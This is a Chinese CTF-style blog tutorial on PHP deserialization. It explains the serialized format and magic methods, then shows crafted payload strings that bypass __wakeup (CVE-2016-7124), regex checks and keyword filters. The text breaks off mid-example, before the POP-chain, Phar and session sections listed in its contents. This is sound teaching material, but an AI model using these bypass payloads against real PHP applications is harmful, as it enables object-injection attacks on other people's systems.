<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[CTF]PHP反序列化总结 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[CTF]PHP反序列化总结" />
<meta property="og:description" content="文章目录 PHP反序列化这一篇就够了简介常见的序列化格式案例引入反序列化中常见的魔术方法反序列化绕过小Trickphp7.1&#43;反序列化对类属性不敏感绕过__wakeup(CVE-2016-7124)绕过部分正则利用引用16进制绕过字符的过滤PHP反序列化字符逃逸情况1：过滤后字符变多情况2：过滤后字符变少 对象注入POP链的构造利用POP链简单介绍简单案例讲解 PHP原生类反序列化利用SoapClient介绍利用方式实战 Phar反序列化什么是phar文件phar文件的结构漏洞利用条件受影响的函数绕过方式 php-session反序列化session简单介绍session 的存储机制php.ini中一些session配置利用姿势session.upload_progress进行文件包含和反序列化渗透使用不同的引擎来处理session文件$_SESSION变量直接可控$_SESSION变量直接不可控 参考文章 PHP反序列化这一篇就够了 简介 序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。
在网上找到一个比较形象的例子
比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
php 将数据序列化和反序列化会用到两个函数
serialize 将对象格式化成有序的字符串
unserialize 将字符串还原成原来的对象
序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。
常见的序列化格式 了解即可
二进制格式字节数组json字符串xml字符串 案例引入 简单的例子(以数组为例子)
&lt;?php $user=array(&#39;xiao&#39;,&#39;shi&#39;,&#39;zi&#39;); $user=serialize($user); echo($user.PHP_EOL); print_r(unserialize($user)); 他会输出
a:3:{i:0;s:4:&#34;xiao&#34;;i:1;s:3:&#34;shi&#34;;i:2;s:2:&#34;zi&#34;;} Array ( [0] =&gt; xiao [1] =&gt; shi [2] =&gt; zi ) 我们对上面这个例子做个简单讲解，方便大家入门
a:3:{i:0;s:4:&#34;xiao&#34;;i:1;s:3:&#34;shi&#34;;i:2;s:2:&#34;zi&#34;;} a:array代表是数组，后面的3说明有三个属性 i:代表是整型数据int，后面的0是数组下标 s:代表是字符串，后面的4是因为xiao长度为4 依次类推 序列化后的内容只有成员变量，没有成员函数，比如下面的例子
&lt;?php class test{ public $a; public $b; function __construct(){$this-&gt;a = &#34;xiaoshizi&#34;;$this-&gt;b=&#34;laoshizi&#34;;} function happy(){return $this-&gt;a;} } $a = new test(); echo serialize($a); ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/1312b5641447e19d581d67efd9650d0e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-05T09:01:02+08:00" />
<meta property="article:modified_time" content="2022-04-05T09:01:02+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[CTF]PHP反序列化总结</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#PHP_1" rel="nofollow">PHP反序列化这一篇就够了</a></li><li><ul><li><a href="#_3" rel="nofollow">简介</a></li><li><a href="#_19" rel="nofollow">常见的序列化格式</a></li><li><a href="#_28" rel="nofollow">案例引入</a></li><li><a href="#_108" rel="nofollow">反序列化中常见的魔术方法</a></li><li><a href="#Trick_124" rel="nofollow">反序列化绕过小Trick</a></li><li><ul><li><a href="#php71_126" rel="nofollow">php7.1+反序列化对类属性不敏感</a></li><li><a href="#__wakeupCVE20167124_146" rel="nofollow">绕过__wakeup(CVE-2016-7124)</a></li><li><a href="#_178" rel="nofollow">绕过部分正则</a></li><li><a href="#_212" rel="nofollow">利用引用</a></li><li><a href="#16_235" rel="nofollow">16进制绕过字符的过滤</a></li><li><a href="#PHP_275" rel="nofollow">PHP反序列化字符逃逸</a></li><li><ul><li><a href="#1_277" rel="nofollow">情况1：过滤后字符变多</a></li><li><a href="#2_319" rel="nofollow">情况2：过滤后字符变少</a></li></ul> 
   </li></ul> 
   </li><li><a href="#_360" rel="nofollow">对象注入</a></li><li><a href="#POP_387" rel="nofollow">POP链的构造利用</a></li><li><ul><li><a href="#POP_389" rel="nofollow">POP链简单介绍</a></li><li><a href="#_393" rel="nofollow">简单案例讲解</a></li></ul> 
   </li><li><a href="#PHP_473" rel="nofollow">PHP原生类反序列化利用</a></li><li><ul><li><a href="#SoapClient_475" rel="nofollow">SoapClient介绍</a></li><li><a href="#_487" rel="nofollow">利用方式</a></li><li><a href="#_516" rel="nofollow">实战</a></li></ul> 
   </li><li><a href="#Phar_560" rel="nofollow">Phar反序列化</a></li><li><ul><li><a href="#phar_564" rel="nofollow">什么是phar文件</a></li><li><a href="#phar_587" rel="nofollow">phar文件的结构</a></li><li><a href="#_615" rel="nofollow">漏洞利用条件</a></li><li><a href="#_621" rel="nofollow">受影响的函数</a></li><li><a href="#_697" rel="nofollow">绕过方式</a></li></ul> 
   </li><li><a href="#phpsession_720" rel="nofollow">php-session反序列化</a></li><li><ul><li><a href="#session_722" rel="nofollow">session简单介绍</a></li><li><a href="#session__728" rel="nofollow">session 的存储机制</a></li><li><a href="#phpinisession_738" rel="nofollow">php.ini中一些session配置</a></li><li><a href="#_745" rel="nofollow">利用姿势</a></li><li><ul><li><a href="#sessionupload_progress_747" rel="nofollow">session.upload_progress进行文件包含和反序列化渗透</a></li><li><a href="#session_753" rel="nofollow">使用不同的引擎来处理session文件</a></li><li><ul><li><a href="#_SESSION_755" rel="nofollow">$_SESSION变量直接可控</a></li><li><a href="#_SESSION_793" rel="nofollow">$_SESSION变量直接不可控</a></li></ul> 
    </li></ul> 
   </li></ul> 
  </li></ul> 
  </li><li><a href="#_887" rel="nofollow">参考文章</a></li></ul> 
</div> 
<p></p> 
<h2><a id="PHP_1"></a>PHP反序列化这一篇就够了</h2> 
<h3><a id="_3"></a>简介</h3> 
<p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p> 
<p>在网上找到一个比较形象的例子</p> 
<blockquote> 
 <p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p> 
</blockquote> 
<p>php 将数据序列化和反序列化会用到两个函数</p> 
<p><strong>serialize</strong> 将对象格式化成有序的字符串</p> 
<p><strong>unserialize</strong> 将字符串还原成原来的对象</p> 
<p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p> 
<h3><a id="_19"></a>常见的序列化格式</h3> 
<p>了解即可</p> 
<ul><li>二进制格式</li><li>字节数组</li><li>json字符串</li><li>xml字符串</li></ul> 
<h3><a id="_28"></a>案例引入</h3> 
<p>简单的例子(以数组为例子)</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xiao'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'shi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'zi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>他会输出</p> 
<pre><code class="prism language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xiao"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"shi"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"zi"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> xiao
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> shi
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> zi
<span class="token punctuation">)</span>
</code></pre> 
<p>我们对上面这个例子做个简单讲解，方便大家入门</p> 
<pre><code class="prism language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xiao"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"shi"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"zi"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
a<span class="token punctuation">:</span><span class="token keyword type-declaration">array</span>代表是数组，后面的<span class="token number">3</span>说明有三个属性
i<span class="token punctuation">:</span>代表是整型数据<span class="token keyword type-declaration">int</span>，后面的<span class="token number">0</span>是数组下标
s<span class="token punctuation">:</span>代表是字符串，后面的<span class="token number">4</span>是因为xiao长度为<span class="token number">4</span>
    
依次类推
</code></pre> 
<p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p> 
<pre><code>&lt;?php
class test{
    public $a;
    public $b;
    function __construct(){$this-&gt;a = "xiaoshizi";$this-&gt;b="laoshizi";}
    function happy(){return $this-&gt;a;}
}
$a = new test();
echo serialize($a);
?&gt;
</code></pre> 
<p>输出(O代表Object是对象的意思，也是类)</p> 
<pre><code>O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
</code></pre> 
<p>而如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"xiaoshizi"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">=</span><span class="token string double-quoted-string">"laoshizi"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">happy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>输出则会导致不可见字符<code>\x00</code>的丢失</p> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" * a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xiaoshizi"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" test b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"laoshizi"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="_108"></a>反序列化中常见的魔术方法</h3> 
<pre><code class="prism language-php"><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//执行unserialize()时，先会调用这个函数</span>
<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//执行serialize()时，先会调用这个函数</span>
<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//对象被销毁时触发</span>
<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span>
<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span>
<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span>
<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//用于将数据写入不可访问的属性</span>
<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span>
<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span>
<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发</span>
<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//当尝试将对象调用为函数时触发</span>
</code></pre> 
<h3><a id="Trick_124"></a>反序列化绕过小Trick</h3> 
<h4><a id="php71_126"></a>php7.1+反序列化对类属性不敏感</h4> 
<p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p> 
<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p> 
<pre><code>&lt;?php
class test{
    protected $a;
    public function __construct(){
        $this-&gt;a = 'abc';
    }
    public function  __destruct(){
        echo $this-&gt;a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
</code></pre> 
<h4><a id="__wakeupCVE20167124_146"></a>绕过__wakeup(CVE-2016-7124)</h4> 
<blockquote> 
 <p>版本：</p> 
 <p>​ PHP5 &lt; 5.6.25</p> 
 <p>​ PHP7 &lt; 7.0.10</p> 
</blockquote> 
<p>利用方式：<code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code></p> 
<p>对于下面这样一个自定义类</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abc'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">'666'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>如果执行<code>unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');</code>输出结果为<code>666</code></p> 
<p>而把对象属性个数的值增大执行<code>unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');</code>输出结果为abc</p> 
<h4><a id="_178"></a>绕过部分正则</h4> 
<p><code>preg_match('/^O:\d+/')</code>匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点</p> 
<ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>serialize(array(<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          a 
         
        
          ) 
         
        
          ) 
         
        
          ; 
         
        
          / 
         
        
          / 
         
        
       
         a));// 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord">/</span><span class="mord">/</span></span></span></span></span>a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li></ul> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abc'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">match</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^O:\d+/'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you lose!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span><span class="token punctuation">;</span>
<span class="token comment">// +号绕过</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// serialize(array($a));</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h4><a id="_212"></a>利用引用</h4> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abc'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">===</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p> 
<h4><a id="16_235"></a>16进制绕过字符的过滤</h4> 
<pre><code class="prism language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00*%00a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00test%00b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"def"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
可以写成
<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span><span class="token constant">S</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"\00*\00\61"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"%00test%00b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"def"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
表示字符类型的s大写时，会被当成<span class="token number">16</span>进制解析。
</code></pre> 
<p>我这里写了一个例子</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'username'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你绕不过！！"</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 未作处理前</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":1:{s:8:"username";s:5:"admin";}'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
